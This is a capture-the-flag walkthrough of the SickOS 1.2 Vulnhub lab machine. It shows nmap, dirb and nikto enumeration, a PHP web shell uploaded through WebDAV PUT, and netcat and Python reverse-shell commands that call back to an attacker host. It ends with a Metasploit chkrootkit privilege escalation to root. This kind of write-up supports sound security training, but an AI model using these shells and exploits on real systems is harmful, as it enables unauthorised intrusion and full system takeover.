#### SickOS 1.2 W1riteup
#### Description: Writeup of SickOS 1.2 VM in Vulnhub by the author D4rk

### Scanning

```
# nmap -A -T4 -PN -sV -p- 172.16.16.141

Starting Nmap 6.40 ( http://nmap.org ) at 2016-05-31 10:28 IST
Nmap scan report for 172.16.16.141
Host is up (0.00027s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
| 2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:85:32:2D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|WAP|media device|storage-misc
Running (JUST GUESSING): Linux 2.6.X|3.X (93%), Crestron 2-Series (87%), Netgear embedded (87%), Western Digital embedded (87%), Google Android 4.X (85%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/h:netgear:dg834g cpe:/o:westerndigital:wd_tv cpe:/o:google:android:4 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 2.6.26 - 2.6.35 (93%), Linux 2.6.32 - 3.6 (93%), Linux 3.0 (93%), Linux 2.6.32 (93%), Linux 2.6.32 - 3.9 (92%), Linux 3.0 - 3.9 (92%), Linux 2.6.23 - 2.6.38 (89%), Linux 3.8 (89%), Crestron XPanel control system (87%), Netgear DG834G WAP or Western Digital WD TV media player (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 172.16.16.141

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 451.60 seconds
```

The only services open are: 

- SSH (22/tcp) - OpenSSH 5.9p1 Debian
- HTTP (80/tcp) - Lighttpd 1.4.28


### HTTP Information Gathering

By browsing HTTP service, we find a simple image:

<IMAGE>

Nothing really interesting there so we hit CRTL + U to check the source code.

```
<html>

<img src="blow.jpg">

</html>
```

Tried to manually check HTTP HEADER but with no luck.

Looked into the headers and nothing really interesting there besides a very small code and also a message " <!-- NOTHING IN HERE ///\\\ -->>>> ". 

```
# telnet 172.16.16.141 80
Trying 172.16.16.141...
Connected to 172.16.16.141.
Escape character is '^]'.
OPTIONS / HTTP/1.0

HTTP/1.0 200 OK
X-Powered-By: PHP/5.3.10-1ubuntu3.21
Content-type: text/html
Content-Length: 163
Connection: close
Date: Tue, 31 May 2016 09:52:34 GMT
Server: lighttpd/1.4.28

<html>

<img src="blow.jpg">

</html>

... snip (GREAT NUMBER OF SPACES)

<!-- NOTHING IN HERE ///\\\ -->>>>
Connection closed by foreign host.
```

The " ///\\\ " part, for some reason made me think on directory traversal. After trying some techniques I've got nothing. 

Tried also to change the image file for another thing in the code using Burp Suite and Firebug Firefox plugin but got nothing.

Clearly the flag is not there in the open, and maybe it's a joke from the admin. Let's try a little bit of dirb.

```
# dirb http://172.16.16.141

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May 31 05:43:09 2016
URL_BASE: http://172.16.16.141/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.16.141/ ----
+ http://172.16.16.141/index.php (CODE:200|SIZE:163)                                                                                                                                                                                  
==> DIRECTORY: http://172.16.16.141/test/                                                                                                                                                                                             
                                                                                                                                                                                                                                      
---- Entering directory: http://172.16.16.141/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue May 31 05:43:11 2016
DOWNLOADED: 4612 - FOUND: 1
```

OK, there is a simple directory found which is "http://172.16.16.141/test/". Browsing to that directory we find a simple directory listing with nothing really interesting there:

```
Index of /test/
Name	Last Modified	Size	Type
Parent Directory/	 	-  	Directory
lighttpd/1.4.28
```

Tried to look for lighttpd/1.4.28 exploits but there were none konwn.

Let's try a little bit of vulnerability scanning with nikto and see if we get something different: 

```
# nikto -h http://172.16.16.141
- Nikto v2.1.4
---------------------------------------------------------------------------
+ Target IP:          172.16.16.141
+ Target Hostname:    172.16.16.141
+ Target Port:        80
+ Start Time:         2016-05-32 11:06:48
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ lighttpd/1.4.28 appears to be outdated (current is at least 1.5.0)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /test/: Directory indexing found.
+ OSVDB-3092: /test/: This might be interesting...
+ 6448 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2016-05-32 11:06:53 (5 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

OK, nikto has found the same /etc directory dirb found, but some additionall things, like OSVDB-12184 related to php. Trying that led us to a phpinfo page:

<IMAGE "php-info.png">

OK, let's try to enumerate HTTP methods using curl. FOund really nothing in "/" but in "/test" I've got the following:

# curl -v -X OPTIONS http://172.16.16.141/test
* Hostname was NOT found in DNS cache
*   Trying 172.16.16.141...
* Connected to 172.16.16.141 (172.16.16.141) port 80 (#0)
> OPTIONS /test HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 172.16.16.141
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Location: http://172.16.16.141/test/
< Content-Length: 0
< Date: Tue, 31 May 2016 10:34:07 GMT
* Server lighttpd/1.4.28 is not blacklisted
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 172.16.16.141 left intact

The /test/ directory appears to be accepting a lot of HTTP Methods, including PUT, which we can use to upload a file. Let's create a simple TXT file just to validate this finding.

```
# curl -v -X PUT -d "Testing 1 2 3" http://172.16.16.141/test/test.txt
* Hostname was NOT found in DNS cache
*   Trying 172.16.16.141...
* Connected to 172.16.16.141 (172.16.16.141) port 80 (#0)
> PUT /test/test.txt HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 172.16.16.141
> Accept: */*
> Content-Length: 13
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 13 out of 13 bytes
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Tue, 31 May 2016 11:16:59 GMT
* Server lighttpd/1.4.28 is not blacklisted
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 172.16.16.141 left intact
```

... and there we have it, our test.txt file:

```
Index of /test/
Name	Last Modified	Size	Type
Parent Directory/	 	-  	Directory
test.txt	2016-May-31 04:17:00	0.1K	text/plain
lighttpd/1.4.28
```

Now let's try to upload a simple php file and see if it works.

```
# curl -v -X PUT -d "<?php phpinfo();?>" http://172.16.16.141/test/test.php
* Hostname was NOT found in DNS cache
*   Trying 172.16.16.141...
* Connected to 172.16.16.141 (172.16.16.141) port 80 (#0)
> PUT /test/test.php HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 172.16.16.141
> Accept: */*
> Content-Length: 18
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 18 out of 18 bytes
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Tue, 31 May 2016 11:18:31 GMT
* Server lighttpd/1.4.28 is not blacklisted
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 172.16.16.141 left intact
```

Again, it worked.

```
Index of /test/
Name	Last Modified	Size	Type
Parent Directory/	 	-  	Directory
test.php	2016-May-31 04:18:31	0.1K	application/x-httpd-php
test.txt	2016-May-31 04:17:00	0.1K	text/plain
lighttpd/1.4.28
```

So now it's time to send a PHP shell file. Using curl i've sent a file named exec.php with the following content inside: 

```
# curl -X PUT -d '<?php system($_GET["cmd"]);' http://172.16.16.141/test/cmd.php
```

Trying to run the file, it worked as expected, so now we can send commands to the remote machine by issuing, for example: 

```
# curl "http://172.16.16.141/test/cmd.php?cmd=ls%20-lha"
total 20K
drwxr-xr-x 2 www-data www-data 4.0K May 31 04:34 .
drwxr-xr-x 3 root     root     4.0K Apr 25 23:38 ..
-rw-r--r-- 1 www-data www-data   31 May 31 04:34 cmd.php
-rw-r--r-- 1 www-data www-data   18 May 31 04:18 test.php
-rw-r--r-- 1 www-data www-data   13 May 31 04:17 test.txt
```

Let's try the easy way and check if the machine has any kind of netcat installed (in URL Enconding way:

```
# curl "http://172.16.16.141/test/cmd.php?cmd=which%20nc"
/bin/nc
```

Yes it has. So let's try a simple reverse shell on port 5000:

```
# curl "http://172.16.16.141/test/cmd.php?cmd=nc+172.16.16.136+5000+-e+%2Fbin%2Fbash"

```

We receive connection but no shell came. So we have to find another way to do it. Let's have a look at the "Pentest Monkey Reverse Shell Cheat Sheet" and try to find a shell for us.

Let's get up netcat in port 443 in our attacker machine, as we can see the victim can communicate with:

```
# nc -lvp 443
listening on [any] 443 ...
```

Now is time to fire up our curl and make the victim throw its shell to us:

```
# curl "http://172.16.16.141/test/cmd.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22172.16.16.135%22%2C443))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27"
```

Now we got it: 

```
# nc -lvp 443
listening on [any] 443 ...
172.16.16.141: inverse host lookup failed: Unknown host
connect to [172.16.16.135] from (UNKNOWN) [172.16.16.141] 44553
/bin/sh: 0: can't access tty; job control turned off
$ 
```

OK, now we have to discover what privileges we have

```
$ whoami
www-data
```

As expected we are under www-data user. So I started to enumerate everything in the server trying to find anything vulnerable like commands configured with SUID that could possible be used to escape to a more privileged shell, etc, etc. Found really nothing interesting besides cron configuration and also chkrootkit. I remember seen a chkrootkit vulnerability a while ago, so I got the version, and it was using 0.49 which is vulnerable.

I took a look at cron and saw that it has cron.daily configured with chkrootkit, the problem is, if I go through that way, it would cost me a day for anything to run and hopefully get me a shell.

I went straight to some exploit databases and in exploit-db.com found a metasploit exploit. I try to avoid automated tools as much as possible, once I can learn a lot more by doing everything manually, but this time it was too welcoming to deny it, so I fired up Metasploit in the hope that it would take less time to exploit the machine.

Instead of using my default netcat reverse shell, as can be seen before, I fired up metasploit exploit/multi/handler and got up a socket on port 443. Then I run my curl link with python to get a shell back:

```
msf > 
msf > use exploit/multi/handler
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > set lhost 172.16.16.135
lhost => 172.16.16.135
msf exploit(handler) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(handler) > run

[*] Started reverse TCP handler on 172.16.16.135:443 
[*] Starting the payload handler...
[*] Command shell session 1 opened (172.16.16.135:443 -> 172.16.16.141:58710) at 2016-05-31 12:18:21 -0400

/bin/sh: 0: can't access tty; job control turned off
$ 

$ $ 
$ ^Z
Background session 1? [y/N]  y
```

Then I started looking for the chkroot exploit and configured it properly:

```
msf exploit(handler) > search chkroot

Matching Modules
================

   Name                           Disclosure Date  Rank    Description
   ----                           ---------------  ----    -----------
   exploit/unix/local/chkrootkit  2014-06-04       manual  Chkrootkit Local Privilege Escalation


msf exploit(handler) > use exploit/unix/local/chkrootkit
msf exploit(chkrootkit) > show options 

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION                           yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(chkrootkit) > set session 1
session => 1
msf exploit(chkrootkit) > set lport 8080
lport => 8080
```

After configuration I fired it. I thought it would take ages but for my surprise in less than 1 minute I had a shell with root privileges:

```
msf exploit(chkrootkit) > run -j
[*] Exploit running as background job.

[*] Started reverse TCP double handler on 172.16.16.135:8080 
msf exploit(chkrootkit) > [!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo obQIOKs74vEBRALo;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "obQIOKs74vEBRALo\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (172.16.16.135:8080 -> 172.16.16.141:52767) at 2016-05-31 12:20:02 -0400
[+] Deleted /tmp/update

msf exploit(chkrootkit) > sessions -l

Active sessions
===============

  Id  Type         Information                                             Connection
  --  ----         -----------                                             ----------
  1   shell linux  /bin/sh: 0: can't access tty; job control turned off $  172.16.16.135:443 -> 172.16.16.141:58710 (172.16.16.141)
  2   shell unix                                                           172.16.16.135:8080 -> 172.16.16.141:52767 (172.16.16.141)

msf exploit(chkrootkit) > 

msf exploit(chkrootkit) > sessions -i 2
[*] Starting interaction with 2...

3496852246
UMIJMPiiuUOWmlFUvBgnxkpegmGiTbQo
true
HWACGRhBkSvKDWkWvrRpYRerAUGWGfZe
mJZoPVQsqQjzWzwCwFoOYzvQeKYjHRjA
gqdsrCEinRXfzYgSRvtdEQvQLiOgimSR

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

Time to look for the flag:

```
cd /root
ls -lha
total 76K
drwx------  4 root root 4.0K Apr 26 03:58 .
drwxr-xr-x 22 root root 4.0K Mar 30 04:57 ..
-rw-r--r--  1 root root  39K Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
-r--------  1 root root  491 Apr 26 03:58 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-rw-------  1 root root 3.0K Apr 26 04:01 .bash_history
-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
drwx------  2 root root 4.0K Apr 12 08:37 .cache
drwxr-xr-x  2 john john 4.0K Apr 12 08:42 chkrootkit-0.49
-rw-r--r--  1 root root  541 Apr 25 22:48 newRule
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

There we have it.

